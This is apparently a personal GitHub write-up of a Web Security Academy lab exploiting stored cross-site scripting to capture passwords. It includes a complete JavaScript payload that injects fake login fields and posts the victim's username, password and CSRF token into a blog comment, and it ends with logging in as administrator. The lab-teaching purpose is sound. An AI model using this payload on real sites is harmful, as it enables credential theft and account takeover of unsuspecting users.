# 🛡️ Web Security Academy Lab: Exploiting Cross-Site Scripting to Capture Passwords
## 🧠 Objective
Exploit a stored XSS vulnerability to capture user credentials (username and password) by injecting malicious JavaScript into a comment form.

## 🧩 Step-by-Step Exploitation Walkthrough
**🔍 Step 1: Reconnaissance**
I began by identifying a comment form on a blog post. The form included fields for comment, name, email, and website—classic vectors for stored XSS.

<img width="922" height="823" alt="Screenshot 2025-10-12 152117" src="https://github.com/user-attachments/assets/d1a6f269-cbbf-4544-a9b9-14cf56c682b8" />

**🧪 Step 2: Crafting the Payload**
I used a script that would capture the username and password from the login form and send them to the server via a POST request. The payload looked like this (DO NOT USE PAYLOADS WITHOUT EXPLICIT PERMISSION):
```
<input type='text' name='username'>
<input type='password' name='password' onchange='hax()'>

<script>
function hax() {
    var token = document.getElementsByName('csrf')[0].value;
    var username = document.getElementsByName('username')[0].value;
    var password = document.getElementsByName('password')[0].value;

    var data = new FormData();
    data.append('csrf', token);
    data.append('username', username);
    data.append('password', password);
    data.append('name', 'victim');
    data.append('email', 'booga@gmail.com');
    data.append('website', 'https://www.google.com');

    fetch('/post', {
        method: 'POST',
        body: data
    });
}
</script>

```
This script was designed to run when the victim typed their password, capturing their credentials and sending them to the server.

**🚨 Step 3: Submitting the Malicious Comment**
I submitted the payload through the comment form. The server accepted it without sanitization, storing the malicious script.

<img width="830" height="608" alt="Screenshot 2025-10-12 152241" src="https://github.com/user-attachments/assets/14c13967-b75a-434d-b9a4-22e5bcdcb3b4" />

<img width="733" height="243" alt="Screenshot 2025-10-12 152303" src="https://github.com/user-attachments/assets/cb06239e-f33b-4433-be9f-ba181cc0ab2a" />

**🎯 Step 4: Triggering the Payload**
When another user (or the lab simulation) visited the blog post and interacted with the login form, the script executed and posted their credentials to the comment section. This confirmed successful exfiltration.

<img width="334" height="109" alt="Screenshot 2025-10-12 152559" src="https://github.com/user-attachments/assets/1a5e5763-970a-48ff-ac84-dd04774cafba" />

**🧪 Step 5: Using the Captured Credentials**
I logged in as the administrator.

<img width="728" height="284" alt="Screenshot 2025-10-12 152706" src="https://github.com/user-attachments/assets/12d72e57-1aaf-427f-adb9-bc98d54f47f1" />

**✅ Step 6: Lab Completion**
The lab confirmed successful exploitation and credential capture.

<img width="920" height="390" alt="Screenshot 2025-10-12 152733" src="https://github.com/user-attachments/assets/6251b2e4-ce76-48a5-8d58-57d172bbfb63" />

### 🧠 Key Takeaways
Stored XSS can be weaponized to capture sensitive data like passwords.

Always sanitize and encode user input before rendering it in the browser.

Credential theft via XSS can lead to full account compromise and privilege escalation.

### 📁 Repository Notes
This writeup is part of my ongoing journey in ethical hacking and web application security. You can find more CTF solutions and lab walkthroughs in my GitHub Portfolio.
